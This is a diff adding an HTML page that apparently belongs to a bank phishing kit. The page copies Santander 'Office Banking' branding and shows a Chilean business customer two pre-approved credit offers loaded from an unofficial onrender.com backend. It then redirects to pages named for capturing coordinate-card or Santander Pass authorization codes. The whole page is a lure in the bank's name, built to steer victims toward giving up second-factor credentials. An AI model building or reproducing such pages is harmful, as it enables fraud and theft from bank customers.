@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Productos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .producto {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+    .producto label {
+      display: flex;
+      align-items: flex-start;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    .producto input[type="radio"] {
+      margin-right: 8px;
+      margin-top: 3px;
+    }
+    .producto span {
+      display: inline-block;
+      max-width: 250px;
+      word-wrap: break-word;
+    }
+    #mensaje {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <h1>PRODUCTOS DISPONIBLES PARA TU EMPRESA:</h1>
+
+    <div class="producto">
+      <label>
+        <input type="radio" name="opcion" value="linea"> 
+        <span>1.- <span id="producto1"></span> por <span id="monto1"></span></span>
+      </label>
+    </div>
+
+    <div class="producto">
+      <label>
+        <input type="radio" name="opcion" value="tarjeta"> 
+        <span>2.- <span id="producto2"></span> por <span id="monto2"></span></span>
+      </label>
+    </div>
+
+    <button class="btn-santander" id="quieroBtn">
+      LO QUIERO<span class="bg-arrow"></span>
+    </button>
+
+    <div id="mensaje"></div>
+  </div>
+ 
+  <script>
+    const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+
+    // Formato CLP
+    function formatoCLP(valor){
+      return new Intl.NumberFormat("es-CL", {
+        style: "currency",
+        currency: "CLP",
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 0
+      }).format(valor);
+    }
+
+    let tipoAutorizacion = "coordenadas"; // valor por defecto
+
+    document.addEventListener("DOMContentLoaded", () => {
+      // Obtener configuración desde el backend
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("producto1").innerText = data.producto1 || "";
+          document.getElementById("monto1").innerText = data.monto1 ? formatoCLP(data.monto1) : "";
+
+          document.getElementById("producto2").innerText = data.producto2 || "";
+          document.getElementById("monto2").innerText = data.monto2 ? formatoCLP(data.monto2) : "";
+
+          // Solo dos tipos válidos: coordenadas o santander
+          tipoAutorizacion = data.tipoAutorizacion || "coordenadas";
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          document.getElementById("mensaje").innerText = "⚠️ No se pudo cargar configuración del servidor.";
+        });
+    });
+
+    document.getElementById("quieroBtn").addEventListener("click", function(){
+      const seleccion = document.querySelector('input[name="opcion"]:checked');
+      if(!seleccion){
+        document.getElementById("mensaje").innerText = "⚠️ Debes seleccionar un producto.";
+        return;
+      }
+
+      // Guardar selección en localStorage (solo para pasar al formulario)
+      localStorage.setItem("seleccionProducto", seleccion.value);
+
+      document.getElementById("mensaje").innerText = "Serás redirigido al área de autorización...";
+
+      setTimeout(() => {
+        if(tipoAutorizacion === "coordenadas"){
+          window.location.href = "autorizacion-coordenadas.html";
+        } else {
+          window.location.href = "autorizacion-santander.html";
+        }
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
